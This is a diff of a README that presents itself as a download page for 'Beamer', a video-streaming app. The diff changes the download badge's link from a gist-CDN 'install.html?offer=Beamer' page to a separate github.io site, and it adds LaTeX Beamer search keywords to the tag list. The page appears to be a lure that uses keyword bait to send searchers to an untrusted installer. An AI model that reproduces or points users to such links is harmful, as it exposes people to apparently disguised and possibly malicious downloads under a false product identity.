@@ -1,6 +1,6 @@
 # Beamer Download — Stream Videos from Mac & Windows to TV  
 
-[![Download Beamer](https://img.shields.io/badge/Get%20Beamer%20Github-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://gistcdn.githack.com/charterfanta70/875c11d3fa2d2579b15c792f580899cd/raw/60bfec385fd1f398ec76d50242975ff0e0daf834/install.html?offer=Beamer)  
+[![Download Beamer](https://img.shields.io/badge/Get%20Beamer%20Github-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Beamer)  
 
 ---
 
@@ -74,7 +74,7 @@ Beamer is ideal for home entertainment setups, movie streaming, and business pre
 ---
 
 ## 🔍 Tags  
-beamer, beamer app, beamer for mac, beamer windows, video streaming software, cast to tv, airplay app, chromecast streamer, wireless media player, cross-platform streaming, beamer mac, beamer pc, beamer desktop, beamer for pc, beamer for windows  
+beamer, latex slide, beamer overleaf, beamer in latex, beamer app, beamer for mac, beamer windows, video streaming software, cast to tv, airplay app, chromecast streamer, wireless media player, cross-platform streaming, beamer mac, beamer pc, beamer desktop, beamer for pc, beamer for windows  
 
 ---
 
